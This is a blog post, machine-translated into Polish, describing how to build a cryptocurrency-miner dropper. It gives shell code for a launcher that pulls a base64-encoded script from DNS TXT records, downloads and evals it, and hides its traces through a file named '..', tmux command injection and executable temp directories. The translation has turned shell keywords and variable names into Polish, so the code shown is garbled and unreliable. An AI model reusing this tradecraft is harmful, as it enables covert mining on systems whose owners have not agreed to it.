<!DOCTYPE html><HTML lang="en"><head><meta charset="UTF-8"/><script type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://unto.re","url":"https://unto.re","copyrightYear":2021,"@context":"https://schema.org/","@type":"WebSite"}</script><script type="application/ld+json">{"audience":"cool people","url":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","author":"untoreh","description":"...How far are you willing to go for...pennies?","mentions":[],"accessModeSufficient":{"itemListElement":["textual","visual"],"description":"text and images","@type":"itemList"},"lastReviewed":"August 21, 2021","@type":"https://schema.org/WebPage","dateCreated":"August 21, 2021","@id":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"August 21, 2021","abstract":"...How far are you willing to go for...pennies?","headline":"Chronicles of a cryptonote dropper","creativeWorkStatus":"Published","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"datePublished":"August 21, 2021","inLanguage":"English","name":"Chronicles of a cryptonote dropper","identifier":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html"}</script><meta content="width=device-width, initial-scale=1" name="viewport"/><link href="/libs/highlight/github.min.css" rel="stylesheet"/><link href="/css/franklin.css" rel="stylesheet"/><link href="/css/main.css" rel="stylesheet"/><link href="/css/menu.css" rel="stylesheet"/><link href="/css/pages.css" rel="stylesheet"/><link href="/css/lunr.css" rel="stylesheet"/><link href="/css/footer.css" rel="stylesheet"/><link href="/css/responsive.css" rel="stylesheet"/><link href="/css/animations.css" rel="stylesheet"/><link href="/css/docco.css" rel="stylesheet"/><link href="/css/flag-icon.min.css" rel="stylesheet"/><link href="/assets/favicon.png" rel="icon"/><title> Kroniki zakraplacza kryptowalut</title><script src="/libs/lunr/lunr.min.js"></script><script src="/libs/lunr/lunr_index.js"></script><script src="/libs/lunr/lunrclient.min.js"></script><script src="/libs/load.js"></script><script type="application/ld+json">{"@id":"https://unto.re/pl/posts/chronichles_of_a_cryptonote_dropper/index.html","url":"https://unto.re/pl/posts/chronichles_of_a_cryptonote_dropper/index.html","abstract":null,"headline":null,"keywords":null,"description":null,"mentions":null,"translator":{"url":"https://translate.google.com/","name":"Google","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"/home/fra/dev/blog/https://unto.re/"},"inLanguage":"pl","name":null,"@type":"https://schema.org/WebPage"}</script></head><body class=""><div class="masthead"><div class="masthead__inner-wrap"><div class="masthead__menu"><a class="site-title" href="/pl/"></a><div class="author__wrap"><script type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"description":"<ul>\n<li><p><strong>Name</strong>: Francesco Giannelli</p>\n</li>\n<li><p><strong>Website</strong>: &#91;«https://unto.re»&#93;, the place where I put stuff I should remember...or forget</p>\n</li>\n<li><p><strong>Location</strong>: south italy {{bio_link}}</p>\n</li>\n<li><p><strong>Year</strong>: &#39;91</p>\n</li>\n</ul>\n","image":"/assets/appa.png","name":"untoreh","@type":"https://schema.org/Person","email":"contact@unto.re"}</script><ul><li class="author__avatar" onclick="toggleTheme()"><img alt=" niereh-światło" class="flip-front" src="/assets/appa.png"/></li><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li></ul></div><nav id="site-nav"><div class="horiz"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/pl/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> posty</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/pl/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> o</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag-icon flag-icon-sa"></span> arabski</a><a class="lang-link" href="/pl/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag-icon flag-icon-bd"></span> bengalski</a><a class="lang-link" href="/pl/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag-icon flag-icon-nl"></span> holenderski</a><a class="lang-link" href="/pl/en/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag-icon flag-icon-gb"></span> język angielski</a><a class="lang-link" href="/pl/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag-icon flag-icon-ph"></span> Filipiński</a><a class="lang-link" href="/pl/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag-icon flag-icon-fr"></span> Francuski</a><a class="lang-link" href="/pl/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag-icon flag-icon-de"></span> Niemiecki</a><a class="lang-link" href="/pl/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag-icon flag-icon-gr"></span> grecki</a><a class="lang-link" href="/pl/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag-icon flag-icon-in"></span> hinduski</a><a class="lang-link" href="/pl/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag-icon flag-icon-it"></span> Włoski</a><a class="lang-link" href="/pl/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag-icon flag-icon-jp"></span> język japoński</a><a class="lang-link" href="/pl/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag-icon flag-icon-id"></span> jawajski</a><a class="lang-link" href="/pl/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag-icon flag-icon-kr"></span> koreański</a><a class="lang-link" href="/pl/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag-icon flag-icon-ms"></span> malajski</a><a class="lang-link" href="/pl/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag-icon flag-icon-cn"></span> Chiński mandaryński</a><a class="lang-link" href="/pl/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag-icon flag-icon-pl"></span> Polskie</a><a class="lang-link" href="/pl/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag-icon flag-icon-pt"></span> portugalski</a><a class="lang-link" href="/pl/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag-icon flag-icon-in"></span> pendżabski</a><a class="lang-link" href="/pl/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag-icon flag-icon-ro"></span> rumuński</a><a class="lang-link" href="/pl/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag-icon flag-icon-ru"></span> Rosyjski</a><a class="lang-link" href="/pl/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag-icon flag-icon-es"></span> hiszpański</a><a class="lang-link" href="/pl/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag-icon flag-icon-se"></span> szwedzki</a><a class="lang-link" href="/pl/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag-icon flag-icon-th"></span> tajski</a><a class="lang-link" href="/pl/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag-icon flag-icon-tr"></span> turecki</a><a class="lang-link" href="/pl/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag-icon flag-icon-ua"></span> ukraiński</a><a class="lang-link" href="/pl/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag-icon flag-icon-pk"></span> Urdu</a><a class="lang-link" href="/pl/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag-icon flag-icon-vn"></span> wietnamski</a><a class="lang-link" href="/pl/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag-icon flag-icon-za"></span> Zulus</a></ul></div></button></li></ul></div><button class="ham"><i class="fas fa-bars ham-icon"></i></button><div class="vert"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/pl/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> posty</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/pl/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> o</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag-icon flag-icon-sa"></span> arabski</a><a class="lang-link" href="/pl/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag-icon flag-icon-bd"></span> bengalski</a><a class="lang-link" href="/pl/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag-icon flag-icon-nl"></span> holenderski</a><a class="lang-link" href="/pl/en/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag-icon flag-icon-gb"></span> język angielski</a><a class="lang-link" href="/pl/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag-icon flag-icon-ph"></span> Filipiński</a><a class="lang-link" href="/pl/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag-icon flag-icon-fr"></span> Francuski</a><a class="lang-link" href="/pl/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag-icon flag-icon-de"></span> Niemiecki</a><a class="lang-link" href="/pl/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag-icon flag-icon-gr"></span> grecki</a><a class="lang-link" href="/pl/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag-icon flag-icon-in"></span> hinduski</a><a class="lang-link" href="/pl/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag-icon flag-icon-it"></span> Włoski</a><a class="lang-link" href="/pl/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag-icon flag-icon-jp"></span> język japoński</a><a class="lang-link" href="/pl/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag-icon flag-icon-id"></span> jawajski</a><a class="lang-link" href="/pl/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag-icon flag-icon-kr"></span> koreański</a><a class="lang-link" href="/pl/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag-icon flag-icon-ms"></span> malajski</a><a class="lang-link" href="/pl/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag-icon flag-icon-cn"></span> Chiński mandaryński</a><a class="lang-link" href="/pl/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag-icon flag-icon-pl"></span> Polskie</a><a class="lang-link" href="/pl/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag-icon flag-icon-pt"></span> portugalski</a><a class="lang-link" href="/pl/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag-icon flag-icon-in"></span> pendżabski</a><a class="lang-link" href="/pl/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag-icon flag-icon-ro"></span> rumuński</a><a class="lang-link" href="/pl/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag-icon flag-icon-ru"></span> Rosyjski</a><a class="lang-link" href="/pl/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag-icon flag-icon-es"></span> hiszpański</a><a class="lang-link" href="/pl/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag-icon flag-icon-se"></span> szwedzki</a><a class="lang-link" href="/pl/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag-icon flag-icon-th"></span> tajski</a><a class="lang-link" href="/pl/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag-icon flag-icon-tr"></span> turecki</a><a class="lang-link" href="/pl/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag-icon flag-icon-ua"></span> ukraiński</a><a class="lang-link" href="/pl/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag-icon flag-icon-pk"></span> Urdu</a><a class="lang-link" href="/pl/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag-icon flag-icon-vn"></span> wietnamski</a><a class="lang-link" href="/pl/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag-icon flag-icon-za"></span> Zulus</a></ul></div></button></li></ul></div></nav></div></div></div><div><h1 id="title"><a href="/pl/posts/chronichles_of_a_cryptonote_dropper"> Kroniki zakraplacza kryptowalut</a></h1><blockquote id="page-description" style="font-style: italic;"> 
                ...Jak daleko chcesz się posunąć za...grosze?
            </blockquote></div><div class="franklin-content"><p> Załóżmy, że chcesz kopać<a href="https://en.wikipedia.org/wiki/Cryptocurrency"> kryptowaluty</a>  na zdalnym<em> wirtualny</em>  sprzęt komputerowy. Musisz znaleźć coś dla siebie. Zdalne serwery oznaczają, nie<a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit"> ASICS</a>  lub algorytmy GPU proof of work, w zasadzie tylko<a href="\posts/a-few-notes-on-proof-of-work"> Monety przyjazne dla procesora</a>.</p><h2 id="the_software"><a class="header-anchor" href="#the_software"> Oprogramowanie</a></h2><p> Wyszukaj i znajdź<a href="https://github.com/xmrig/xmrig"> górnik</a> , ale to nie jest naprawdę fajne, chciałbyś coś, co możesz lepiej kontrolować z pilota, więc znajdziesz<a href="https://github.com/Bendr0id/xmrigCC"> inny górnik</a> . Ty też chcesz<a href="https://github.com/Bendr0id/xmrigcc-proxy"> pełnomocnik</a> , ponieważ wiele połączeń będzie krótkotrwałych, nie chcesz<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack"> dos</a>  Twój basen górniczy. Również<a href="https://github.com/search?q=tunnel"> tunel</a>  byłoby miło.</p><h2 id="the_design"><a class="header-anchor" href="#the_design"> Projektowanie</a></h2><p> Niektóre botnety wykorzystują dane z łańcuchów bloków do wyszukiwania poleceń,<a href="https://twitter.com/sarahjamielewis"> ktoś</a>  również wydaje się mieć<a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968"> przegrane zakłady</a>  to się nie powtórzy... w każdym razie nie jesteśmy tak wyrafinowani, poradzimy sobie z kilkoma rekordami DNS, które przechowują skrypt, który ściąga ładunek, który samorozpakowujący się w katalogu tymczasowym wykonuje i opuszcza<em> prawie</em>  brak śladów jego konfiguracji. Oto mały schemat blokowy, który przedstawia strukturę</p><img alt="" src="/assets/posts/output/payload.png"/><h2 id="launcher"><a class="header-anchor" href="#launcher"> Wyrzutnia</a></h2><p> Celem skryptu startowego jest to, aby był dostępny i łatwy do aktualizacji, tak aby wytrzymał próbę czasu. Aktualizacja<a href="https://en.wikipedia.org/wiki/Domain_Name_System"> DNS</a>  rekordy są łatwe, a DNS jest ostatnią rzeczą, która zostaje zamknięta w sieci… ponieważ adresy IP są trudne do zapamiętania… więc są szanse, że będzie dostępny przez większość czasu. Widzisz, kiedy jesteśmy<em> pobieranie skryptu wdrożeniowego</em>właściwie już uruchamiamy jakąś logikę, to jest skrypt uruchamiający, potrzebuje on możliwości wykonywania zapytań DNS, aby wyszukać nasze rekordy, DNS może być wszechobecny, ale<a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/"> kopać</a>  nie jest.</p><p> Jest tu trochę zagadki, jeśli musimy pobrać inne narzędzie<em> pobrać inny skrypt, aby pobrać ładunek</em>  powinniśmy po prostu pobrać ładunek! W obronie... wykonanie tego skryptowego tańca zwiększa zaciemnienie, pozwala zachować tylko jedną implementację programu uruchamiającego (utrzymanie, tak), w większości przypadków nie jest wymagane.. więc serwisujemy również<a href="https://en.wikipedia.org/wiki/Standalone_program"> połączone statycznie</a>  kopiuj plik wykonywalny do wykonywania zapytań DNS, pobieranych przez własny hosting lub hosting w chmurze (tak, są awaryjne, takie jak 3 lub 4, ponieważ usługi w chmurze mają bardzo minimalną wolną przepustowość, a także wymagają plików cookie lub tokenów dostępu ... są bardzo skryptowe nieprzyjazny, celowo, oczywiście).</p><p> Co znajduje się w rekordach dns? Używamy<a href="https://en.wikipedia.org/wiki/TXT_record"> tekst</a>  rekordy w domenie niestandardowej (tutaj też są rezerwy awaryjne). Dlaczego TXT? tak się składa, że ​​są to te, które mogą przechowywać największą ilość danych..zwykle ponieważ jest to trochę<a href="https://www.ietf.org/rfc/rfc6763.txt"> Zalecana</a>  zależy od<em> rzeczy</em> . Specjalnie używamy<a href="https://www.cloudflare.com/"> rozbłysk chmur</a>  za nasze manipulacje przy DNS, ponieważ jest bezpłatne i prawie jedynym graczem w mieście (<em> cóż, nie bardzo, ale wszelkie inne alternatywne funkcje bledną mądrze</em> ). Zdarza się, że możesz przechowywać wiele fragmentów danych na<em> To samo</em>  rekord... to zaczyna być mylące i niezrozumiałe dla niektórych specyfikacji... (styczna) Cloudflare<a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size"> wykorzystywany do</a>  pozwolić<em> przykuty</em>Rekordy TXT o łącznej wielkości ~9k bajtów, dokumenty teraz podają ~2k bajtów, przed zmianą używałem ~6k, myślę, i obsługiwałem skrypt nieskompresowany, po czym musiałem rozcieńczyć skrypt i skompresować go przed ręką (właściwie ja próbowałem użyć<a href="https://freedns.afraid.org/"> freedns</a>  dostawcy, zostałem zbanowany w ciągu jednego dnia, zgadując, że mają ścisłą politykę beztłuszczowych rekordów TXT), jednak kompresja gzip wydaje się NIE być przyjazna dla potoku i nadal powodowała problemy, więc musiałem upchnąć skrypt bez kompresji ( styczna końcowa).</p><p> Jak to przechowujemy? Rekordy TXT obsługują tylko ciągi alfanumeryczne, nie<a href="https://en.wikipedia.org/wiki/Null_character"> NUL</a> , więc musimy go owinąć w kodowanie inne niż null,<a href="https://en.wikipedia.org/wiki/Base64"> podstawa64</a>  spełnia to ograniczenie, a ponieważ przechowujemy<em> przykuty</em>  rekordy TXT, musimy chunkować dane wyjściowe, ponieważ używamy rzeczy powłoki, odbywa się to za pomocą<code>-w</code>  flaga, na busybox taka flaga była nieobecna (lub opt-in) w starszych wersjach, co było denerwujące, alternatywą jest użycie enkodera dołączonego do openssl,<code>openssl enc -base64</code>.</p><p> Teraz, gdy wiemy, jak przechowywać nasz skrypt wdrożeniowy, przechowujemy go albo<a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md"> por. cli</a>  lub ręcznie. Jak to robimy? Wspomnieliśmy, że potrzebujemy bindutils lub własnych<code>dig</code> ...po wybraniu obsługującego endpointu chcemy go pobrać, co jest zwykle dostępne<a href="https://www.gnu.org/software/wget/"> wget</a>  lub<a href="https://curl.se/"> kędzior</a> , wget jest znacznie częściej preinstalowany, jednak busybox zapewnia obsługę tls tylko z dynamicznymi bibliotekami, więc musisz upewnić się, że punkt końcowy obsługuje http lub twoje narzędzie jest<code>wget</code>  z gnu-utils</p><pre><code class="bash hljs"><span class="hljs-comment"># the wget command</span>
wget -t 2 -T 10 -q -i- -O- &gt; <span class="hljs-variable">$filename</span> &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable"> $digurl</span>"</span></code></pre><p> To znaczy spróbować<code>-t2</code>  czas oczekiwania<code>-T10</code>  sekundy są<code>-q</code>  ciche czytanie od<code>-i-</code>  standardowe wejście (<code>$digurl</code> ) i piszę do<code>-O-</code>  wyjście (<code>$filename</code>). To polecenie nie ujawnia na pierwszy rzut oka tego, co pobieramy. Będziemy bardzo ostrożni z innymi poleceniami powłoki z tego samego powodu, lub z trzymaniem się powłoki (<a href="https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29"> grzmotnąć</a> ) wbudowane tam, gdzie to możliwe. Zadbaj również o to, gdzie pobierasz pliki wykonywalne, chcesz mieć pewność, że możesz je wykonać, ponieważ niektóre punkty montowania, zwłaszcza w kontenerach i<code>tmp</code>  ścieżki są<code>noexec</code> . Teraz, gdy mamy nasze narzędzie do zapytań DNS, pobieramy nasze rekordy</p><pre><code class="bash hljs">dig txt <span class="hljs-variable">${record}</span>.<span class="hljs-variable">${zone}</span> +short +tcp +timeout=3 +retries=0 <span class="hljs-variable">$dnsserver</span></code></pre><p> Flagi są tutaj oczywiste,<code>+short</code>  oznacza po prostu, że interesują nas tylko same dane, dzięki czemu nie musimy analizować danych wyjściowych. Ważne jest, aby określić serwer DNS, taki jak google (<code>8.8.8.8</code> ) lub rozbłysk chmur (<code>1.1.1.1</code> ), ponieważ wiele środowisk domyślnie przekierowuje zapytania DNS lub proxy do własnych serwerów DNS. Po pobraniu pofragmentowanego skryptu zajmujemy się cudzysłowami i białymi znakami, aby był gotowy do dekodowania</p><pre><code class="bash hljs">data=<span class="hljs-variable">${data//\"}</span><span class="hljs-comment"># remove quotes</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># remove whitespace</span><span class="hljs-built_in">declare</span> -a ar_data
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span><span class="hljs-variable">$data</span>; <span class="hljs-keyword">do</span>
    ar_data[<span class="hljs-variable">${l:0:1}</span>]=<span class="hljs-variable">${l:1}</span><span class="hljs-comment"># iterate over each line and remove the first characther</span><span class="hljs-keyword">done</span>
data=<span class="hljs-variable">${ar_data[@]}</span><span class="hljs-comment"># join all the lines</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># ensure joining didn't add whitespace</span><span class="hljs-comment"># decode</span>
launcher=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable"> $wyrzutnia</span>"</span> | <span class="hljs-variable"> $b64</span>  -d -w<span class="hljs-variable"> $chunksize</span>)</code></pre><p> Co jeśli teraz my<em> nadal</em>  nie masz naszego launchera? DNS jest niechlujny, chcemy powrotu, skonfigurujmy subdomenę, aby bezpośrednio pobrać skrypt uruchamiający. Przed oceną naszego skryptu chcemy go dostosować za pomocą niektórych zmiennych, ponownie użyjmy rekordu TXT do przechowywania listy zmiennych NAZWA=WARTOŚĆ i przeanalizowania jej. Jest też rezerwa na zmienne, cloudflare oferuje przekierowania na podstawie adresów URL, te przekierowania są obsługiwane<em> przed</em>  miejsce docelowe, więc nie potrzebujemy punktu końcowego, chcemy tylko skonfigurować reguły przekierowania oparte na wyrażeniach regularnych do fikcyjnego punktu końcowego, interesują nas parametry adresu url<code>?NAME=VALUE&amp;NAME2=VALUE2...</code>, dzięki czemu możemy sparametryzować nasz launcher po prostu zmieniając adres URL przekierowania, zawsze z dbałością o cytowanie i kody escape</p><pre><code class="bash hljs"><span class="hljs-comment">## m1 also important to stop wget</span>
pl_vars=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable"> $token_url</span>"</span>  | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | grep -m1<span class="hljs-string"> 'Lokalizacja'</span> )
pl_vars=<span class="hljs-variable"> ${pl_vars#*\/}</span> 
pl_vars=<span class="hljs-variable"> ${pl_vars//\"&amp;/\" }</span> 
pl_vars=<span class="hljs-variable"> ${pl_vars//%3F/\?}</span></code></pre><p> wget<code>-S</code>  wyświetla adres URL przekierowania, który interesuje nas do przeanalizowania. Mając parametry i skrypt, oceniamy zmienne zapisując je w pliku</p><pre><code class="bash hljs"><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-variable"> $pl_vars</span>"</span><span class="hljs-built_in"> Echo</span><span class="hljs-string">"export \
<span class="hljs-variable"> $pl_vars</span> \
<span class="hljs-variable"> $ENV_VARS</span> \
"</span> &gt;śr.sz</code></pre><p> Ten plik będzie pochodził ze skryptu wdrażania are. Ostatnią częścią skryptu startowego jest aktualizacja<a href="https://en.wikipedia.org/wiki/Trampoline_(computing)"> trampolina</a> , oceń skrypt w bieżącym procesie powłoki lub, jeśli to możliwe, pozwól mu być zarządzany przez tmux.</p><pre><code class="bash hljs"><span class="hljs-comment"># printf preserves quotes</span><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-subst"> $(printf '%s'<span class="hljs-string">"<span class="hljs-variable"> $wyrzutnia</span>"</span>)</span>"</span>  &amp;&gt;/dev/null
<span class="hljs-comment"> # lub tmux</span><span class="hljs-built_in"> Echo</span><span class="hljs-string">"<span class="hljs-variable"> $wyrzutnia</span>"</span> &gt; <span class="hljs-string">".. "</span> 
tmux send-keys -t miner<span class="hljs-string">". ./\".. \""</span>  Wejść</code></pre><p> Skrypt programu uruchamiającego jest zrzucany do pliku o nazwie „..”, co wygląda na mylące, ponieważ można go pomylić z<em> rodzic</em>  informator. I nie dołączamy polecenia session, ponieważ pozostałoby ono w poleceniu procesu, zamiast tego rozpoczynamy sesję tmux wcześniej i wysyłamy polecenie źródłowe przez interfejs terminala tmux. W związku z tym czasami wywoływanie pliku wykonywalnego z<code>./</code>  przechowuje te znaki w poleceniu, więc lepiej dodać<code>$PWD</code>  do ścieżki...<code>PATH=$PWD:$PATH</code>.</p><h2 id="the_payload"><a class="header-anchor" href="#the_payload"> Ładunek</a></h2><p> Nasz skrypt wdrażania zaczyna się od pozyskania<code>env.sh</code>  plik i zachowanie lub skonfigurowanie vars jako<code>STARTING_*</code>  vars lubią</p><pre><code class="bash hljs">STARTING_PATH=<span class="hljs-variable">${STARTING_PATH:-<span class="hljs-variable"> $PATH</span>}</span> 
STARTING_PID=<span class="hljs-variable"> $BASHPID</span></code></pre><p> Pozwala nam to na zabicie i ponowne uruchomienie działającej instancji podczas resetowania środowiska. Przejdźmy do katalogu tmp z możliwościami exec</p><pre><code class="bash hljs"><span class="hljs-comment"># out local subdirectory</span>
pathname=$(<span class="hljs-built_in">printf</span><span class="hljs-string">".%-<span class="hljs-subst"> $((LOSOWY%9+1)</span> )s"</span><span class="hljs-keyword"> dla</span>  ph<span class="hljs-keyword"> w</span>  {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class="hljs-built_in"> lokalny</span> ,~/.pamięć,~/};<span class="hljs-keyword"> robić</span> 
    rm -rf<span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable"> $ścieżka</span>"</span>  &amp;&amp;
        mkdir -p<span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable"> $ścieżka</span>"</span>  &amp;&amp;
        tmppath=<span class="hljs-string">"<span class="hljs-variable">$ph</span>/<span class="hljs-variable"> $ścieżka</span>"</span>  &amp;&amp;
        is_path_executable<span class="hljs-string">"<span class="hljs-variable"> $tmppath</span>"</span> &amp;&amp;
        <span class="hljs-built_in"> eksport</span>  ŚCIEŻKA=<span class="hljs-string">"<span class="hljs-variable"> ${ph}</span>/<span class="hljs-variable"> $ścieżka</span>:<span class="hljs-variable"> ${ŚCIEŻKA}</span>"</span>  tmppath &amp;&amp;
        <span class="hljs-built_in"> przerwa</span><span class="hljs-keyword"> Gotowe</span> 
